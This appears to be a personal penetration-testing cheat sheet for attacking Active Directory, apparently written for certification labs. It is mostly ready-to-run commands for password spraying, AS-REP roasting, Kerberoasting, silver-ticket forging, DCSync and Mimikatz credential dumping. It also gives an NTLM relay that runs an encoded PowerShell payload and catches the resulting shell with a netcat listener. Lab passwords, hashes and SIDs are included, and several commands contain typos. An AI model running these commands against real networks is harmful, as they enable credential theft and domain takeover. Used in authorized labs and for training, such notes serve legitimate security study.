## Password Attack
```
netaccounts
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC=($domainObj.PdcRoleOwner).Name  
$SearchString="LDAP://"  
$SearchString+=$PDC+"/"  
$DistinguishedName = "DC=$($domainObj.Name.Replace('.',',DC='))"  
$SearchString+=$DistinguishedName  
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!") (Creating new object with other user creds. If invalid creds provided we'll get error) 
```

#### FOR PASSWORD SPRAYING USE 

```
.\Spray-Passwords.ps1-Passpasswordhere-Admin or

crackmapexec smb 192.168.235.75 -u users.txt -p 'Nexus123!' -dcorp.com --continue-on-success (try to enumerate list of users for input here)

Note: In o/p if there is pwn3d! then that user has local admin privileges  
cme can be used for - smb,rdp,winrm,ssh,ldap. (Add --pass-pol after ip to know if it has account lockout implemented)

FOR  

.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"

Note: If you receive a network error, make sure that the encoding of usernames.txt is ANSI. You can use Notepad's Save As functionality to change the encoding.
```

#### TO IDENTIFY OUR USER IS ADMIN AT WHICH SERVER IN LIST OF SERVERS  
```
crackmapexec smb ip.txt -u pete -p'Nexus123!' -d corp.com --continue-on-success
```

## AS-Rep Roasting
In kerberos first AS-REQ is sent and if creds are valid then DC sends AS-REP which has TGT and session key. We can capture that and bruteforce offline that’s called AS-REP Roasting.  
Note: Do not require Kerberos preauthentication should be enabled for this attack to work.

"WE CAN DO THIS ATTACK WITHOUT PASSWORD OR EVEN WITHOUT CREDS"

##### FOR LINUX:
```
impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete 
(in o/p we'll get a user who has the above mention option enabled then its vulnerable to as-rep roasting) 

impacket-GetNPUsers -dc-ip 192.168.50.70 -request 'htb.local\'
```
Note: We can do this even without creds 
##### FOR WINDOWS:
```
.\Rubeus.exeasreproast/nowrap 
```
##### FOR CRACK:
```
sudo hashcat -m 18200 hashes.asreproast ~/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force 
```
##### HOW TO CHECK IF THE USER HAS DO NOT REQUIRE KERBEROS PREAUTH ENABLED?
```
Get-DomainUser -PreauthNotRequired (Windows)
impacket-GetNPUsers -dc -ip 192.168.50.70 corp.com/pete (Kali) 
```

Note: Generic All or Generic Write permission enabled? we can not only force change password but we can also manipulate UAC value to enable Do not require kerberos pre-auth. This is called Targeted AS-REP Roasting. We can reset the UAC value once we got the hash.

## Kerberoasting
User wants to access a specific service in DC so they request TGS and Session key(TGS-REP). DC validates creds if external and if internal we can directly request for TGS and session key since DC does not validate who is requesting for TGS.
##### Windows Internal
```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast (Windows Internal)  
psexec.py active.htb/administrator@10.10.10.100
```
##### Linux External
```
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete (Linux External)  
```
##### For Crack
```
sudo hashcat -m 13100 hash ~/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force (Cracking Pass)
```

**Note**: impacket-GetUserSPNs throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," we need to synchronize the time of the Kali machine with the domain controller. We can use ntpdate3 or rdate4 to do so.  
This is immensely powerful if we crack high privileged service accounts  
If the SPN runs in the context of a computer account, a managed service account,5 or a group-managed service account,6 the password will be randomly generated, complex, and 120 characters long, making cracking infeasible. e.g: krbtgt - a service account. So run on user accounts

Generic All or Generic Write permission? We can not only force change the password but also we can set an SPN for user and kerberoast it

## Silver Ticket
We can impersonate any domain user to access a specific service by forging TGS

User and group permissions in the service ticket are not verified by the application in a majority of environments. Application executing in context of service accounts trusts it blindly. Privileged Account Certificate (PAC) validation is an optional verification process between the SPN application and the domain controller. If PAC Enabled DC checks the privileges of authenticating user in ST. Service Applications rarely does this.

We can try if we have password hash of the SPN, a machine account, or user

We can create our own service ticket called Silver Ticket if we have, 
```
SPN password hash - mimikatz > sekurlsa::logonpasswords  
Domain SID > whoami /user (omit last part since that’s RID)  
TargetSPN - Enumerate SPN
```

##### Steps:  
```
iwr-UseDefaultCredentials http://web04 (trying to access)

401Unauthorized?

kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin (/ptt to inject forged ticket to memory)

klist

iwr - UseDefaultCredentials http://web04 

We can use (iwr -UseDefaultCredentials http://web04).Content to view source code
```

## Add Exploit DCSync Rights
Do you have WriteDACL to a domain? Give DCSync rights to an unprivileged domain user account:  
```
Add-DomainObjectAcl - TargetIdentity "DC=burmatco,DC=local" -PrincipalIdentity useracct1 -Rights DCSync
```
WORKED?
```
impacket-secretsdump oscp.exam\offsec:password@ip
    
cat hash | grep::: |awk-F:'{print$4}' > hash.out
   
Use crackstation or hashcat -m 1000 --user
```

## DC Sync (Uses DRSUAPI)
More DC are used in Prod to provide redundancy and it uses Directory Replication Service (DRS) Remote Protocol for this by requesting an update for specific object or user account. DC receiving that update does not check whether that came from another DC. It checks only SID and priv.  

Rights - Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set (these should be there by default it will be for domain admins, enterprise admins, etc.,).
    
If we have access to these accounts or above rights are set we can perform DC-Sync attack by impersonating a DC. 
Note: This allows us to request any user credentials from the domain  

##### FOR WINDOWS:
    
```
.\mimikatz.exe  
lsadump::dcsync/user:corp\dave(wecangetanyusercredshere) lsadump::dcsync/user:beyond\Administrator
```
##### FOR LINUX:  
```
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70 (We'll get NTLM hash)
```

## Mimikatz (Use when you have Admin Priv)
```
privilege::debug (To check Admin privilege)  
token::elevate (To elevate Admin Privileges to run commands as Admin) 
lsadump::sam (to dump sam passwords from lsass process memory) 
sekurlsa::tickets(AD)  
sekurlsa::logonpasswords (AD) (All users logged in to current system )  
crypto::capi  
crypto::cng

to crack 
Crackstation.net  
Note: Administrator's hash might same for two different machines.

```
### Cracking Net-NTLMv2
(If you are as any user in shell but dont know the password. We can use this to get the password)
Identify username and check if he's in which group  
```
sudo responder -I tun0 (turning on responder and listening on interface tun0 ) ( Responder by default has smbserver )  
dir \\192.168.119.2\test (using dir command to list unknown share which tries to authenticate to responder and we get hash) 
save hash in hash.txt
hashcat -m 5600 paul.hash ~/rockyou.txt --force  
```
```
Tips: Look for file upload functionalities and intercept request. In File_name= parameter add \\\\kaliip\share to get net-ntlm hash in responder
```

## Relaying Net_NTLMv2
We access to Files01 as local user (non-admin) we can setup an relay mech. which doesn't print ntlm hash but forwards that to Files02(Other machine). This is worth if our normal user is admin user on other machine.
```
sudo impacket-ntlmrelayx --no-http-server -smb2support -t "targetipwewantorelay" -c "powershell -encJABjAGwAaQBlAG4AdA..." 
nc -lvnp 4444  
dir \\kaliip\share (In our local user machine)
```
##### Wordpress - backup migration plugin ?
Relaying cmd
```
Where shall the backups be restored > \\kaliip\kali
```
